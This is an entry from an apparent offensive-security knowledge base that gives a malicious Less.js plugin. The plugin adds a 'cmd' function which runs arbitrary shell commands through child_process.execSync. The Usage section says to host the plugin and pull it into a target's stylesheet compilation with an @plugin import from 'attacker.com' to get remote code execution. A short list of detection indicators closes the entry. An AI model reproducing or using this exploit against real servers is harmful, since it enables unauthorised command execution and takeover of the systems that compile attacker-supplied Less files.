---
type: code
language: javascript
verified: true
created_at: '2023-04-06T03:56:40.037703+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Node.js
tags:
  - rce
  - less.js
  - plugin
  - ssti
validated: true
---

# less-js-malicious-plugin-registration

## Code

```javascript
//Vulnerable plugin (3.13.1)
registerPlugin({
    install: function(less, pluginManager, functions) {
        functions.add('cmd', function(val) {
            return global.process.mainModule.require('child_process').execSync(val.value).toString();
        });
    }
})
```

## Description

This JavaScript code defines a malicious Less.js plugin using registerPlugin. The install function adds a 'cmd' function to the Less environment, which synchronously executes system commands via child_process.execSync and returns the output as a string. Targeted at vulnerable Less.js versions for SSTI-based RCE.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| val.value | Input value passed to cmd(), typically a command string | ls -la |

## Usage

Save as plugin.js and host on an HTTP server. Import via @plugin "http://attacker.com/plugin.js" in a .less payload submitted to the target. Invoke cmd() in Less rules to execute commands, e.g., for reconnaissance or payload delivery.

## Detection

- Server-side JavaScript execution traces showing registerPlugin calls from external sources.
- Anomalous execSync invocations in Node.js process trees during CSS compilation.
- WAF alerts on @plugin directives with remote URLs.

## Related

- [[procedures/Exploit-SSTI-in-Less.js-Plugins-for-RCE]]
- [[commands/less-import-remote-plugin]]
